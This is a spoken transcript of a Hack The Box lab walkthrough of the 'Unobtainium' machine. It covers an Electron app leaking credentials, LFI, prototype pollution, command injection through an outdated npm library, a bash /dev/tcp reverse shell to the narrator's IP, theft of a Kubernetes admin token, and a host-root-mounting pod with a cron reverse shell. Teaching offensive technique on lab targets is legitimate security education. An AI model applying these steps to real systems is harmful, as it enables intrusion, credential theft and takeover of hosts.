 what's going on youtube this is ipsec i'm doing unobtainium from hack to box which i don't know what this box's name means or even how to pronounce it but that being said it's a really great box that tests your kubernetes knowledge but before you get to those k-8s you have to exploit a electron app and a lot of people did this to do static analysis i did through dynamic analysis because that's my go-to first essentially i ran the electron app with wireshark running and analyzed it to find the lfi with that lfi you can leak the server source code and there's two different exploits in there there's a rce and the upload functionality using an outdated library but in order to access that you need admin access or admin role and you use a javascript pollution type of attack to grant your user the admin ability so then you can hit that rce function once you get shell on the box you find out you're in kubernetes and can do a bunch of just kubernetes things to move around and eventually getting to a spot where you can create your own pod and assign that pod slash on the root disk and with slash from the root disk you can just um get code execution obviously like a cron job uploading an ssh key etc so with that being said let's jump in as always we can start off with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats printing the nmap directory and call it unobtainium and hopefully i type that right but if not typers don't matter at this step and finally the ip address of 101010235 this can take some time to run so i've already ran it looking at the results we have quite a bit of information the very first thing being ssh on port 22 and its banner tells us it's an ubuntu server then we have http on port 80 and its banner is telling us it's running apache but also ubuntu if we looked at like launchpad which is like ubuntu's repository for these versions we could probably get out what distribution of ubuntu it is we have eight four four three it's just open as nmap's telling us it's https and looking at these headers it looks definitely like https traffic the interesting header is x kubernetes dash pf which is a indication of what application this is running we do get it is forbidden because we're not giving it a token and this looks very much like the kubernetes api interface based upon what i'm seeing here so if we had a token we maybe i'll enumerate this more but right now it doesn't look like we have too much however since it is ssl i'm looking over this because i likes getting the host names out of the certificate so here we have the host name of minicube and then it's all names we have minicube ca uh the control plane a control plane is what i think um kubernetes like api master interface thing is called then we got a bunch of dns names um it's just taking off the most child or leftmost thing each so kubernetes.default.service.cluster.local and then we got uh kubernetes.default.service so maybe it's not just taking that out maybe it's taking it from yeah the right the rightmost not leftmost kubernetes.default and then finally kubernetes we also have localhost and its ip addresses of 101010 235 1096.01 and this is a internal kubernetes ip address that you can use to access um this control plane from being within a pod it's like when you're running in aws and you want to access its api its ip address is 169 254 169.254 these are just like ips to get information from the host and then we have 100 i don't know exactly what this is probably some kubernetes thing on port 31337 elite we have an http server running the nodejs express framework and that is it for open ports so let's go take a look at what we have uh the first thing i want to do is go to 10 10 10 235 and i've already done that it's just a simple web page that says unobtainium simple responsive high availability multi-platform chat application by unobtainium i don't see any links here i'm going to do control u just to see if there's anything i'm missing in the source and by links i mean i saw these download things i was looking for something that linked the host name of the box don't see anything there we can curl um port elite so 10 10 10 235 31337 and we just get something back and empty array or whatever so let's just download this package unobtainium.dev uh dot deb the debian package if i was on like centers or red hat i would download the rpm and we could also analyze the snap but i don't know that much about snap so i know d package i'm gonna use that so let's move what we downloaded so move downloads um unobtainium there we go over here and we can unzip it and we got a md5 sum and a dot deb i'm just going to clean up the md5 sum and the zip and we could extract this um i think it's like ar x to extract um let's make dur temp cp this n2 temp and then air x unobtainium yeah we could extract this and then go reversing it but static analysis is always going to be slower than dynamic so i'm going to start off with dynamic analysis that's generally what i like doing and based upon what i find out dynamically i know what to look at when i start pulling apart the app so i'm going to do sudo d package dash i to install it and we should probably take a snapshot before installing this because all sorts of bad things can happen when you un install packages that you don't know but we're setting it up and now we have it running i can do which unobtainium to see where i installed it it's in my user bin we can just execute it and we get this application and it says unable to reach unobtainium.htb so what i'm going to do is copy this into my host file so sudo vi etsy host and we can say 101010 235 unobtanium.h because that's where it talks to and then i also want to run wireshark while i'm playing with this application to see how it does traffic um whenever i do application analysis i always like just opening up wireshark to examine it because every now and then you get lucky and just see things in the um packets so if i go to like message logs this is just blank so this looks very much like when we just curled port elite uh post message to do and we have something here create administrator zone update node.js api server add login functionality complete get message feature complete to do feature implement cloud storage function and it post it here so i don't know what to really make of this to do message and i really hate seeing to do's i'm going to post a message test and if i go to message log i can see this but let's take a look at what wireshark has seen so going into wireshark i'm going to stop this so we get stopped getting traffic if there is any when we open the application up we got this head we can actually just follow tcp streams and then we'll just go next stream oh wait there are a lot of them are here sweet i did not expect to see multiple but we have a head and this is when it opens this is probably just testing if it can reach the server it says yep i can reach it and again it's talking on poor elite and then it does this so nothing really in this stream so if i do find let's see so next stream i could have swore oh increment stream by one there we go so this is me clicking on probably the to-do it does a post request and we have some hard-coded credentials we got the moss and password of winter 2021 so the first thing i'm going to do is try sshing into this box so sh101010 235 we have to specify the user fella moss uh accept the certificate first put the password in and we get a disconnect so nothing there but it is just getting a file name of to do dot text we can look at the other things but i want to return back to this because i want to try lfi looking at the next one we got another off this is me putting the message we can see message text and it just uses the put command and nothing too special there so since this is just a http server we can easily manipulate this by just running burp suite um we could use curl and do everything manually but i like staying within burp as much as i can so what i'm going to do is go over to um let's see proxy options we're going to add a listener binder port elite and then on request handling we're going to redirect it to 10 10 10 235 elite and then click ok and in our host file we're going to change something i'm going to control c out of the app because we want to relaunch it so sudo v at z host and unobtainium i'm going to put 12701 there we go we launched the app again and in my http history is blank that's fine i'm going to turn intercept off for now go back to burp and we can see it made the head request to burp suite if we want we can click on like to do and we see it's making that request so either i can just press ctrl r here and intercept it or repeat it or i can go to proxy intercept turn it on click to do and do it this way but the first thing i want to do is take a look at um the lfi so it looks like it's grabbing to do.text this is a linux box based upon nmap so i'm going to try etsy passwd and the server looks like it's just hanging so i'm guessing we can't do lfi and um like directories outside of where it is i'm trying a bunch of dot size slashes to see if this works doesn't look like it does if we just give it something blank we do get an error message so we can see it is node and express whatever we also know that based upon the header so this error message isn't really giving us too much information i think let's see oh actually we got app index.js so we know index.js is probably the main file and looks like there's a route.js and a layout.js so if i do index.js we get something let's try route.js we don't let's see where was that i wonder if we can get it user source so router index router route so i'm not sure exactly why we can't grab this file it may be like going into a um infinite loop of including this file going back including the file going back not sure if we wanted to like do bust other files um we know the extension is going to be js so we can now use f so i'm going to do fuff dash u http then 10 10 10 235 sl colon 31337 slash to do because it is getting here and we also want to give it this so dash d for data let's see let's put this in single quotes and then fuzz dot js so this is going to um put everything from a word list which our word list that we're going to use is up sec list uh what is it discovery web content raph small words dot text okay and then i think the last thing we have to do is the header and this is going to be the content type application json i think this is good let's see what happens let's see it's doing a post request 10 10 10 235 31337 elite and we don't have a and single quote on that dot js so let's add that real quick see go here add that and that's actually we also aren't completing the json i guess i didn't copy everything correctly let's see phone name okay there we go and right off the bat we get index so this will probably take a while to run it's only doing 194 per second it doesn't tell me how big that word list is but this is how you could use fluff to automate discovering other files but we know index.js so let's go take a look at it uh access is denied route i probably um like deleted the content header or type etsy passwd okay index.js there we go yeah i probably when i copied it deleted this and that's why it happened but i'm going to copy this and let's do vim is my home directory of tmux not where i want it to be hdb unobtanium that's going to be annoying so v index.js we're going to put that here and i want to clean this up a little bit so percent s i'm going to replace new lines with a return and that looks much better uh we have a bunch of trailing spaces percent s unlimited spaces to um nothing and replace that this is looking better awesome so we have this var root loading this google cloud storage command i don't know exactly what that is yet users we have two we got felomos and we got admin and the password for admin is math.random to string32 so we can kind of get an estimate at what this is by going into a dev console i just pressed f12 and i'm on the console tab so i can run the javascript math.random and then we can say to string it was 32. so we can run this a few times and we see it's always zero dot something so it's lower alphanumeric so if i do let's see echo dash n wc-c 11 characters um i want to say there's 24 characters in the alphabet and 10 numbers so probably 34. so if i do 34 to the 11th power that is a really big number uh let's see copy put commas after every three and let's see 100 000 million billion trillion quadrillion so yeah this is like 70 quadrillion 188 trillion 843 billion 638 million 32 thousand and 384. um i know i say nmap's going to take a water run but this would take a long time to run to send that many like uh http requests to try to brute force it so um we're not going to brute force this password so there's probably something else we can do here the fact that there is this can delete and can upload is definitely interesting so let's take a look at upload functionality i'm just doing slash upload to see how it works we see const user equals find user and if user does not exist or user doesn't have this can upload then send a403 otherwise it's going to do root upload and take the file name i don't really see what the body of this is so i don't know what we're uploading it looks like it's just creating a file what is root root is this google cloud storage thing so i'm going to go here we can say google cloud storage commands npm and let's see is this the page looks like it is we can say this package has been deprecated because it is old we have a github repository for it and let's see looking at index.js it's calling root.upload i think it was root.upload yup so here's this upload functionality and it's executing gsutil and then let's see i think we're writing into bucket right here foul name true so if we are we just have direct command execution if we're writing to any of these variables and i'll make this bigger so you can read it if you want but we know we want to get here because there's an exact so let's take a look at the rest of this app we got this to do and the to do right here is um saying if the index is outside of me then exit i think so that's what hangs the other thing we did was a um put and this app.put on slash this is let's see do we're not intercepting it if i was i had the history going where i did this didn't let's go back to the app message log post message this is what i want we can say please subscribe this is probably doing the put request so we can save this one to be lfi this put so going back into the source we see it's using merge and if i google let's google merge dangerous uh node.js express is part of node.js so that's why i search this and it's talking about prototype pollution and why it's such a big deal and you can go read this whole thing i think there's a video in the link as well but essentially it's allowing us to inject stuff into objects when merge is called and the hilarious thing is how they recommend is say hey if this attribute has this underscore underscore proto um do nothing so that's the kind of fix for that and i don't see [Music] this merge calling anything about proto so if we can inject this into the message we can do bad things i'm just going to open a new tab so we have a clean console and we can demo this so if i just say ipsec is equal to an object and we call ipsec we got nothing let's make evil also equal to an object so if i call ipsec or evil both are currently just objects if i say ipsec.action doesn't exist because we just have a blank object i'm going to do evil proto dot action is equal to please subscribe and evil dot action now exists right i'm just going to hit up a few times and ipsec.action also exists because of this prototype whatever it is pollution and it just merged our action into the previous variables so we can potentially just add the can upload thing to our um user so this message text that should be let's see where was the merge called it's merging message so we just do a comma here and then do quote proto underscore like that and add our object can upload and we close that proto out and i think that is good so before i call this let's try uploading something and to upload we probably want to look back at the source so upload we don't have it available to us here i want to like admin if i click this except off i don't know if i can get here yeah and this is just an electron app if you want to reverse it the easy way i tell if things are electron is i press ctrl r and it does a refresh i guess speaking of that we can do can upload equals true it sends this control r refresh nothing happened so i'll see if a hidden function came available but let's go to the source how does upload work it's a post to upload and the body of it is filename so let's go here this is now no longer put it's a post do slash upload and probably need file name and we can say ping dash c1 10 10 14 8 because 10 10 14 8 is my ip so if i execute this we get access denied but it's probably like the auto healing functionality if i do this and then execute it still access denied what put we added can upload let's see if it's pinging something weird is going on so sudo tcp dump dash i ton zero icmp send this go to upload send and we didn't get anything oh um we need to copy our auth because yeah that's the one thing we missed so let's copy this auth comma file name so okay true and we are pinging ourselves so the next thing to do is a reverse shell and because i'm already like within a quotes i really like to base64 encode this so i'm going to do echo dash n actually i don't have to do dash n so bash c i actually we don't need the bash dash c here and the reason why we don't need it is because our payload is going to have it at the very end so if i just do echo b64 here then base64-d bash so this whole dev dev tcp thing is a bashism so if it's not within bash if you're using like the dash shell or zsh i don't think you can do a reverse shell like this so that's why i always prepended this command with bash c to ensure i'm within bash but since i'm ensuring him within bash somewhere else that's why i'm not doing it so zero at and one uh wait like this first dev tcp 10 10 14 8 9 000 1 0 and 1 there we go put this in single quotes base 64-w0 so we can copy this and then we can paste it here and send it and we weren't listening nclvnp9001 and boom we have a reverse shell so python3 dash c import pty pty dot spawn then bash then sdty raw minus echo fg enter enter and here we are we can close this out we can also close out this app and close out wireshark just to minimize what applications we're running so we are within kubernetes i don't know what this clear cube ctl thing is though but we knew this box was kubernetes based upon port 8443 and the um header saying kubernetes we can also do lsa on slash see we're within docker um this host name is a very like pod-like hostname of doing a unique identifier um i think this is the name space it's running and this is the unique identifier of the pod don't quote me i'm not a kubernetes expert we'd also cat etsy hosts and kubernetes manage host file so we're definitely within kubernetes our ip address is 172 17 0 10. so there's two things within kubernetes um the first thing you want to always get is this cube ctl command which isn't in pods by default but we can just download and add it and then there's um the buster cube challenge by end guardians that is really good i would highly recommend reading all of this stuff the buster cube but and guardians also released a tool called pyrates or however you pronounce this um this is a box of like i don't know how to pronounce all the words i'm saying like that unobtainium this pirates whatever but really good girling tool so i'm going to download this tool and we're also going to download the cubectl command so we have both so let's just go here amd 64. uh let's see copy link and then cd hdb i really should fix my tmux home directory uh let's see this box is unobtainium maker dub dub dub and we can we get this tool uh tar dash xvf is it just x for xz looks like i'm right move this into my host and awesome we have this file and just clean up the directories pirates linux amd.tar okay now we should download the cubectl so i'm just going to google cubectl download i think and see what this brings us install tools this looks good on linux and a curl uh let's see yep download it where i wanted to so i can do python3 dash m http dot server and we can download everything so dev shm wget 10 10 14 8 8 000 cube ctl and we'll download this and i want to say cube ctl is also written in golang i'm not positive the language pirates is now that that's downloaded we can go back and download the other one p-i-p-e-i-r-a-t-e-s and this is gonna take a while to download as well so i'm gonna speed it up for the video and it looks like we ran out of space i'm guessing this is because i'm in ram disk so i'm just going to remove what i did and download it and slash temp to see if we have enough space here and i probably should move the other tool over into slash temp it now save to slash temp so i'm just going to move the other one out of dev shm so we don't fill up the ram disk and we can look at how big each of these are i'm guessing cube ctl is definitely go lane because it's 45 megs and pi rates is 47 megs but yeah so if we do ch mod plus x uh k p star like that that's just shorthand to make both of these executable we can run both things and i'm going to export term to x term and i'm also going to fix my tty i'm going to set the rows to 35 and columns to 136 because i have a feeling uh running these tools i'm going to type a lot and this like wrapping is weird so stty rose 30 35 columns 136. there we go so now my line wrapping is all fixed the first thing i want to do is just run cubectl and we can say off can i list to see what permissions we have and we can list namespaces and this is just a basic kubernetes enumeration um kubernetes stores its stuff and is it run secrets kubernetes dot io service account so if i grabbed this ca.cert and token and put it on my host operating system i could access kubernetes over that 8443 port but um i'm not doing it because i like doing everything from within the pod because that's more realistic and a lot of times when you exploit kubernetes you're also not going to have a route to the kubernetes admin interface but you're going to have a route to the admin interface from within the pod so that's why i'm doing it this way if we look at token we can see it is just a jwt so this i mean i guess the easiest way would be go to jwt and view the token that way i think it's jwt dot io yes right site i love when i guess things right so this top piece is just telling us the algorithm we can see the actual payloads the service account the default name secret and then the signature so the master database is going to have what signs this so we can't really spoof this token but the cube ctl command automatically uses the token so going back to what we were doing before let's go to temp cube ctl auth can i list and this is going to list the namespaces so we can say oh i can list namespaces so let's do cubecto then get name spaces and we can see all the namespaces we have default dev cube node least cube public cube system uh the interesting one is dev and also cube system cube system is like the god permission we can say can i list and specify the name space cube system and we can't really do anything with cube system name space so we didn't get anything else if i go to dev we can see if i use the dev name space i can list the pods so if i do um cube ctl get pods let's do dot slash forbidden but if i specify the name space of dev i can get the pods and we can see there are three pods running we can say cubectl describe pod and then a pod name and if you don't know again cube ctl describe pod pod name dash and dev whenever we're doing something we have to specify it is in dev and we can see the port is 3000 and where is the ip ip address 1704 so we can list pods that way but this is a lot to remember all these cube ctl commands if you're not using kubernetes often so that's why inguardians has this tool pi rates and it just gives you an option of a lot of cool things you can do even built-in cloud stuff with aws and google cloud because normally that's where kubernetes is running but we can say um if we do one it's we don't have permission to list the service account contact so that's going to error out uh we can see ourselves but if we try to do anything else here like yeah can't do anything there if we do two we can list name spaces and this is where we see the name spaces so two we can switch to actually i'm going to leave it at default real quick we try 3 to print out pods and we can try 4 to get all the info on pause and we can't so that's why i'm going to switch namespace to dev and this is when i kept adding the dash and dev to all my cube ctl commands so now when i do three we can list the pods and i do four we get all the same output just in json so ip address 172 1705 uh the port is somewhere up here where is it yeah right here ports 3000 we can see zero seven as well so we got a bunch of pods running if we want we also have a port scan within this so we can do a full port scan and see 3000 is the only port open so let's exit pirates and we can make a coral quest against 172 17 0 i think five was one of them and it's just a empty thing i'm going to add dash v so i can see the headers and we see it is a express framework so i'm guessing this is just the same application but in dev we can easily test it out because we did all this in burp suite so let's copy this as a curl command paste it in and then change the port and ip so let's say 172 1705 port 3000 and it returns ok true so let's go to the upload and we'll copy this as a curl command as well i just want to make sure i have this closing bracket uh copy as curl command and then 172 17 0 5 i think we did before yep and we need to listen on port 9001 and we get a shell here and our host name is different um here we're web app deployment and here we're devno deployment so we're in a different container so what i'm going to do python 3 c import pty pty dot spawn then bash and st2y raw minus echo fg enter enter stty rows 35 columns 136 to fix everything and then we should also download it to files so wget 10 10 14 8 put 8 000 and i'm going to try something i don't know if it's going to work um see 10 10 14 8. the reason why i just x'ed out a lot is because it looked like i had a trailing period that i couldn't get rid of but what i'm going to do i'm going to say cube ctl and then pi rates like this and see if it w gets both of them um not positive for work well looks like it will um it's downloading the first one we'll see if it goes on to the second one after it finishes and success it is downloading the second file so that little bashism just saved me from typing a whole command awesome so now we have both applications in slash temp i can chmod plus x kp stir and we can execute these commands export term is equal to x term there we go so the first one we did was what cubectl auth can i list to see what we can do and we can't really do anything here and i don't like this part of the challenge because it's really weird i don't know if this is realistic or not but we can't really list the name spaces but we'll be able to impersonate the dev name space or not dev the cube system namespace i'm not sure exactly how you find this out other than just testing it but if i do cube dash system i can see i can now have this access to secrets if i do cube dash public do i get anything extra and what's the other one um see curls pirates get pods can i list oh wait this is get namespaces i think yep cube node lease can't really get that so the cube system we can and if i do cube ctl here with get namespaces i actually can't get them because i don't have that namespaces thing in my dash dash list like up here in this web deployment i can list the namespaces but can't hear but we can get secrets so with this we can get secrets using the namespace cube system and here's a list of all the secrets the one that really sticks out is this admin token so if i do describe secrets describe secrets and post the admin token i need the name space of cube system we can get the token for this admin and if i go back to the jwt thing we can see this is the namespace service and we are the admin and this token actually gives privilege to create pods so let's copy this token and i'm just going to do vi token we don't have vi nano don't have nano echo this to token there we go and we should use cube ctl again and if i do um auth can i create pods we get no dash n cube system we still can't however if i change the token to be that admin so i think it's just dash token so dash token is equal to cat temp token see is it dash dash token yes i can create pods with this admin token and since i can create a pod i can do a attack where it actually mounts the creates a pod with the root disk mounted to it and then adds an ssh key or runs a command to get a reverse shell um i'm probably going to do that at the very end but first i want to switch over to pi rates and do it this way because it is definitely definitely easier the weird thing about this is because i can't list things i can't switch to namespace cube system since i can't switch to the namespace cube system i can't grab all the secrets and we could try like removing this um can i so before it runs any command it uses this auth can i i can disable this and try it so two list name spaces we can't we can try setting to cube system it's not a valid name space if i try to list secrets still can't that being said if i run pirates dash h i can see the options and if we do dash t we can specify a token i wonder if i can just cat token this way temp token and yeah so i think now i am running as the um c admin user and since i can create a pod i can just specify this attack so let's do attack 20 ip 10 10 14 8 port 9001 before i hit enter let's make sure we're listening and it's going to um use my pods image and attack so it may take like 30 seconds for it to get the reverse shell but what it's doing is we can look at the code actually because it's open source that'll probably be the easier thing while we wait so let's go to um where is it buy rates go here we go this is the main function we want to probably grab the host mount this 20 let's just search for the code for mount fine pod volume mounts case 20 here we go it's going to get the ip and then execute this mount root fs function so if we go in here we can see exactly what it's doing and it creates a emo file to create the pod so pod image is gonna be a string the name is attack container it's executing command to sleep infinity so it just waits and it's mounting slash root and the host path is slash of the disk and then once it starts it creates a cron to run the python command of a reverse shell so what i'm guessing is happening is spins up a pod writes the cron into the well spins up a pod mounting the root disk to the pod and then edits the cron tab of the root disk to be a python reverse shell says attack was successful and we are now here i do lsm well i'm on the root if i do lsa on slash we don't have anything um let's see crontab dash l see cat etsy cron tab and there we go so pyrates is editing the etsy cron tab file with a reverse shell so let's try explaining that by doing it all manually and then that will be the video to create a pod we need to get a big yaml file because that's how it does configuration we can grab it from cube ctl so if i do get pods with a specify the token of system so dash dash token is equal to cat token so we can get the pod and just take any random pod and change the output to yml and we have a big nasty blob so we could try filtering this all out or just doing an example pod so example kubernetes podiamo probably misspelled that but google will fix it for me and go to create static pods and we have a pretty good example here it's not going to do anything dangerous but it does give us everything we need except i don't know if it will i think i'm just going to cheat and use oxdf's config file because before doing the video me and him always collaborate to see if we did things differently and for this box we did things wildly differently but i'm going to cheat and copy it from his video so let's just open up hdb what is it um unobtainium www.v pod.yaml and i'm going to paste from his notes and this will be on his website it's sending the api version saying it's a pod he's using the alpine system alpine's just smaller than node.js which is what the other pod used if we look at this this one is let's see where is it right here image localhost 5000 node server um alpine's just smaller it should work with either putting in the cube system namespace he's calling the pod evil oxdf doing this staying the sleep so um for this like a high number so it's going to automatically die after however many seconds this is it's slightly different than the pirates way of just saying sleep indefinite i think if we look at theirs where was the sleep command yeah sleep infinity i didn't know that was an actual thing in the sleep binary but maybe it is maybe sleep infinity just sleeps forever and then mount points taking slash mount and it's on the host fs pointed to slash so slash mount in this pod will be slash of the host os so we can save this and then base64 pod.yaml w0 this is a quick way to copy it to our pod and we can say echo base64-d pod.yaml and then we can do ctl dash dash token cat token and that needs to be equals and we can use the apply command to call this demo and we can see the pod was created so now if i say get pods dash n i think it's in the cube system name we can see the alpine is running 10 seconds ago so cubectl exact exact to execute he called it evil oxdf and stdn tty cube system and we need the token and then standard n is going to be ben sh let's do dot slash uh pods evil oxdf not found exact i wonder if it's just alpine ls slash mount yep looks like it was just alpine so if i go into root uh wait it just died on me maybe it auto deletes it after a period let's go back to that apply command paw.yaml it's created okay cd slash mount root we can verify yes we're on the host root.text so we could create our ssh key and then just sshn but if we cat etsy cron tab we can see that's already there from our pi rates running so hope you guys enjoy the video take care and we'll see you all next week
